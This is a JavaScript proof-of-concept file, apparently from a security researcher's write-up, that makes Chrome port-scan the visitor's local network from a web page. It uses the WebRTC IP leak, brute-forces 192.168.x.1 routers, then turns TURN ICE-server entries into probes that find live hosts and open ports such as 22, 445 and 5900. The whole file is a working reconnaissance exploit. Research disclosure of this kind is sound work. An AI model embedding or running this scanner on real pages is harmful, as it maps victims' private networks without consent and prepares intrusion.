/*
   This script is a proof of concept for ICE server scanning using TURN uri. It *only* works
   on Chrome and it has only been tested on:

   - Chrome 79.0.3945.79 for OS X
   - Chrome 79.0.3945.88 for OS X
   - Chromium 79.0.3945.79 for Ubuntu
   - Chrome 79.0.3945.79 for Windows 10
   - Chrome 79.0.3945.88 for Windows 10

   For full details on how this work, see my write up here: 
   
   https://medium.com/@jbaines/using-webrtc-ice-servers-for-port-scanning-in-chrome-ce17b19dd474
 */
(function(window) {
  // The ports we'll scan for each active host. This doesn't need to be global
  // but this is written so just adding / subtracting ports magically works so
  // I've put this at the top for anyone to easily find and play with.
  var ports = [21, 22, 23, 25, 53, 80, 443, 445, 5900, 8080];

  // A place to hang the addresses we've brute forced (if it comes to that). Don't like globals? Listen,
  // I don't tell you how to hack your javascript.
  var brute_addresses = [];

  // The amount of time we'll allow for ICE candidate gathering when scanning unknown hosts (in milliseconds).
  var scanning_timeout = 3000;

  // The final list of addresses to port scan.
  var to_scan = [];

  // Onload we need to do a few things:
  //
  // 1. Is the client Chrome? If not, then exit. This PoC only works on Chrome.
  // 2. Is ?sleep=1 in the url? If not, add it. Chrome(?) likes to cache ICE servers or something,
  //    so weird results *may* occur if the page is refreshed quickly. Hence if sleep=1 is in the
  //    url this script will sleep for 30 seconds before...
  // 3. Initiate discovery of the clients IP address
  window.onload = function() {
    // poor man's browser detection
    if (navigator.userAgent.includes("Chrome") == false) {
      // inform the user we ain't doin' nothin'
      document.getElementById("status").innerHTML = "Chrome browser not detected. Nothing to do.";
      return;
    }

    if (window.location.href.includes("?sleep=1")) {
      document.getElementById("status").innerHTML = "Entering 30 second timeout.";
      setTimeout(function() {
        // sleep until the weird caching issues resolve themselves.
        document.getElementById("status").innerHTML = "Preparing to scan";
        findInternalIP();
      }, 30000);
    } else {
      history.replaceState({
        current: "state"
      }, "", "?sleep=1");
      findInternalIP();
    }
  }

  // findInternalIP discovers the client's local IP address using the well-known WebRTC IP leak
  // "vulnerability" (see: https://github.com/diafygi/webrtc-ips). However, on Chrome this feature
  // isn't guarenteed to work due to Chrome's "Anonymize local IPs exposed by WebRTC" feature that
  // returns a .local address which is entirely useless for our purposes 
  // (see: https://bloggeek.me/psa-mdns-and-local-ice-candidates-are-coming/).
  //
  // If, for whatever reason, we are unable to discover the client's local address then we'll call
  // the bruteForceAddress function. However, if we do get a valid IPv4 address then we'll jump
  // directly into iceScan()
  function findInternalIP() {
    document.getElementById("status").innerHTML = "Finding client's internal IP address.";

    var local_address = null;
    var localpc = new RTCPeerConnection();
    localpc.createDataChannel('', {
      reliable: false
    });

    // For each new ICE candidate, filter out v6 or mdns addresses, and select *one*
    // local address. Last one wins (note: even with multiple interfaces, I've only seen
    // one local address given anyways).
    localpc.onicecandidate = function(e) {
      if (e.candidate == null) {
        return;
      }

      if (e.candidate.address.includes(':') == true ||
        e.candidate.address.includes('.local') == true) {
        // the address is v6 or an mdns .local address. Not much we can do
        // with those. Return and pray for something better.
        return;
      }

      local_address = e.candidate.address;
      document.getElementById("address").innerHTML = local_address;
    }

    // Once candidate gathering has completed, check to see if we found a local address.
    // If we have, awesome! Move on to LAN scanning. If not, we'll need to move on to
    // brute forcing instead.
    localpc.onicegatheringstatechange = function(e) {
      if (localpc.iceGatheringState == "complete") {
        localpc.close();

        if (local_address != null) {
          iceScan(local_address);
        } else {
          document.getElementById("address").innerHTML = "Unable to obtain";
          bruteForceAddress();
        }
      }
    }

    // trigger the gathering of ICE candidates
    localpc.createOffer(function(description) {
        localpc.setLocalDescription(description);
      },
      function(e) {
        console.log("Create offer failed callback.");
      });
  }

  // bruteForceAddress is called when we've failed to obtain the client's local address via
  // the webrtc local ip leak. As such, we're forced to guess what the user's subnet might be.
  // As written, this code scans:
  //
  // 192.168.[0-255].1
  //
  // The assumption being that a router or something is at .1 and that the majority of private
  // IP spaces are probably 192.168.0.0/16... at least we hope so since 172.16.0.0/12 and
  // 10.0.0./8 are significantly more time sconsuming to scan.
  //
  // We can all 256 addresses at once by shoving them into an RTCPeerConnection as TURN uri.
  // See the header of this file for more details on that.
  function bruteForceAddress() {
    document.getElementById("status").innerHTML = "Brute forcing a LAN address.";

    // generate the 256 192.168.x.1 TURN uri. They'll take the following form:
    //
    // turn:192.168.0.1:445?transport=tcp
    //
    // Which will get Chrome to send a TCP/TURN request to port 445 on 192.168.0.1.
    // The port *does* matter. I've chosen 445 because it will either be unpopulated
    // *or* the protocol *should* reject the initial message from the browser. Meaning,
    // an onicecandidateerror will be generated quickly.
    var brute_array = [];
    for (i = 0; i < 256; i++) {
      brute_address = "turn:192.168." + i + ".1:445?transport=tcp";
      brute_array.push({
        urls: brute_address,
        credential: "lobster",
        username: "albino"
      });
    }

    // create a new peer connection using the array we just created as the ICE servers.
    // Note that I'm not sure iceCandidatePoolSize is helpful here, but I assumed it didn't hurt either.
    var rtc_brute = new RTCPeerConnection({
      iceServers: brute_array,
      iceCandidatePoolSize: 0
    });
    rtc_brute.createDataChannel('', {
      reliable: false
    });

    // Any ICE candidate that returns back to us is considered "active." At this time, Chrome doesn't
    // generate candidate errors for addresses that don't exist.
    rtc_brute.onicecandidateerror = function(e) {
      if (e.url == null) {
        return;
      }

      url_split = e.url.split(":");
      brute_addresses.push(url_split[1]);
    }

    // After scanning_timeout milliseconds stop the ICE candidate gathering and shutdown this
    // peerconnection. If we found addresses we can move on to scanning. If we didn't find anything
    // then they host probably isn't on a 192.168.0.0/16 subnet sooooo we can't do anything else.
    setTimeout(function() {
      rtc_brute.close();
      if (brute_addresses.length > 0) {
        address = brute_addresses.pop();
        iceScan(address);
      } else {
        document.getElementById("status").innerHTML = "Brute forcing failed. Done.";
      }
    }, scanning_timeout);

    // trigger the gathering of ICE candidates
    rtc_brute.createOffer(function(offerDesc) {
        rtc_brute.setLocalDescription(offerDesc);
      },
      function(e) {
        console.log("Create offer failed callback.");
      });
  }

  // iceScan takes the provided address, assumes that the address is in a /24, and scans 254
  // addresses within that space (.0 and .255 aren't scanned). The scanning is done WebRTC
  // ICE candidate scanning (for me details on that see the header). Assuming we find
  // active hosts, this function will then move on to ipScan().
  function iceScan(address) {
    document.getElementById("status").innerHTML = "Scanning local network for active hosts.";

    // drop the octet and pretend that's the subnet.
    subnet = address.substr(0, address.lastIndexOf("."));

    // generate the 254 "subnet" TURN uri. They'll take the following form:
    //
    // turn:x.x.x.[1-254]:445?transport=tcp
    //
    // Which will get Chrome to send a TCP/TURN request to port 445 on x.x.x.[1-254].
    // The port *does* matter. I've chosen 445 because it will either be unpopulated
    // *or* the protocol *should* reject the initial message from the browser. Meaning,
    // an onicecandidateerror will be generated quickly.
    var address_array = [];
    for (i = 1; i < 255; i++) {
      probe_address = "turn:" + subnet + "." + i + ":445?transport=tcp";
      address_array.push({
        urls: probe_address,
        credential: "helter",
        username: "skelter"
      });
    }

    // create a new peer connection using the array we just created as the ICE servers.
    // Note that I'm not sure iceCandidatePoolSize is helpful here, but I assumed it didn't hurt either.
    var rtc_scan = new RTCPeerConnection({
      iceServers: address_array,
      iceCandidatePoolSize: 0
    });
    rtc_scan.createDataChannel('', {
      reliable: false
    });

    // Any ICE candidate that returns back to us is considered "active." At this time, Chrome doesn't
    // generate candidate errors for addresses that don't exist.
    rtc_scan.onicecandidateerror = function(e) {
      if (e.url == null) {
        return;
      }

      // generate a div for this IP so the user can sew what's going on
      url_split = e.url.split(":");
      host_div = document.createElement('div');
      host_div.id = url_split[1];
      host_div.innerHTML = url_split[1];
      document.getElementById('hosts').appendChild(host_div);

      // save the IP for later scanning.
      to_scan.push(url_split[1]);
    }

    // After scanning_timeout milliseconds stop the ICE candidate gathering and shutdown this
    // peerconnection. If we have other subnets to scan, then call iceScan again. Otherwise,
    // if we found addresses we can move on to scanning. 
    setTimeout(function() {
      rtc_scan.close();
      if (brute_addresses.length > 0) {
        address = brute_addresses.pop();
        iceScan(address);
      } else {
        // always add localhost
        host_div = document.createElement('div');
        host_div.id = "127.0.0.1";
        host_div.innerHTML = "127.0.0.1";
        document.getElementById('hosts').appendChild(host_div);
        to_scan.push("127.0.0.1");

        ipScan(to_scan);
      }
    }, scanning_timeout);

    // trigger the gathering of ICE candidates
    rtc_scan.createOffer(function(offerDesc) {
        rtc_scan.setLocalDescription(offerDesc);
      },
      function(e) {
        console.log("Create offer failed callback.");
      });
  }

  // ipScan scans the ports[] on each IP in to_scan[]. The scans are completed in a single ICE candidate
  // gathering. I actually don't know how many Chrome will let a user get away with... at least 256.
  // This function will auto-terminate after 60 seconds. Although, in an unfiltered world, the scan
  // should already be done by then.
  function ipScan(to_scan) {
    document.getElementById("status").innerHTML = "Port scanning " + to_scan.length + " active hosts. Generating " + (to_scan.length * ports.length) + " requests. Please wait ~45 seconds.";

    // generate the to_scan * ports TURN uri. They'll take the following form:
    //
    // turn:x.x.x.x:y?transport=tcp
    //
    // Which will get Chrome to send a TCP/TURN request to port y on x.x.x.x. For each server,
    // we do expect a response (unless the host is configured to not respond) in the form of an 
    // icecandidateerror event.
    var address_array = [];
    for (i = 0; i < to_scan.length; i++) {
      for (j = 0; j < ports.length; j++) {
        probe_address = "turn:" + to_scan[i] + ":" + ports[j] + "?transport=tcp";
        address_array.push({
          urls: probe_address,
          credential: "helter",
          username: "skelter"
        });

        // generate divs to place responses in
        port_div = document.createElement('div');
        port_div.id = to_scan[i] + ports[j]
        port_div.innerHTML = "&nbsp;&nbsp;&nbsp;-> Port " + ports[j] + " - ?"
        document.getElementById(to_scan[i]).appendChild(port_div);
      }
    }

    var port_scan = new RTCPeerConnection({
      iceServers: address_array,
      iceCandidatePoolSize: 0
    });
    port_scan.createDataChannel('', {
      reliable: false
    });

    // We can use the icecandidateerror event messages to tell us if a port is closed or if a port is open.
    // We know its open if:
    //
    // -  The event contains a hostCandidate that *isn't* 0.0.0.x:0. The host candidate will take the form
    //    192.168.88.x:62798... this means the TCP connection was established. If the initial message from
    //    the client causes the server to kill the connection then the event should show up quickly with an
    //    empty errorText (ideal). However, if the server keeps the connection open then it will take ~40
    //    seconds or so for the connection to timeout. When that happens, the event will contain the errortext
    //    "TURN allocate request timed out."
    //
    // On the flip side we know the remote port is closed if the hostCandidate is 0.0.0.x:0.
    port_scan.onicecandidateerror = function(e) {
      if (e.url == null) {
        return;
      }

      url_split = e.url.split(":");
      port_split = url_split[2].split("?");

      if (e.hostCandidate != "0.0.0.x:0") {
        document.getElementById(url_split[1] + port_split[0]).innerHTML = "&nbsp;&nbsp;&nbsp;-> Port " + port_split[0] + " - <b><i>Open</i><b>"
      } else {
        document.getElementById(url_split[1] + port_split[0]).innerHTML = "&nbsp;&nbsp;&nbsp;-> Port " + port_split[0] + " - Closed"
      }
    }

    // If it's still running, kill the scan after 60 seconds. It's possible that the scan is still in
    // the gathering state. This occurs when there is no response to a request. It's no big deal.
    // Leave those ports flagged as '?' and we'll pretend those are filtered.
    setTimeout(function() {
      if (port_scan.iceGatheringState === "gathering") {
        document.getElementById("status").innerHTML = "Connection timeouts. Done.";
        port_scan.close();
      }
    }, 60000);

    // If we get notice that the scan has completed, then close the peer and inform the user that
    // we're all done here.
    port_scan.onicegatheringstatechange = function(e) {
      if (port_scan.iceGatheringState == "complete") {
        document.getElementById("status").innerHTML = "Done.";
        port_scan.close();
      }
    }

    // trigger the gathering of ICE candidates
    port_scan.createOffer(function(offerDesc) {
        port_scan.setLocalDescription(offerDesc);
      },
      function(e) {
        console.log("Create offer failed callback.");
      });
  }
})(window);
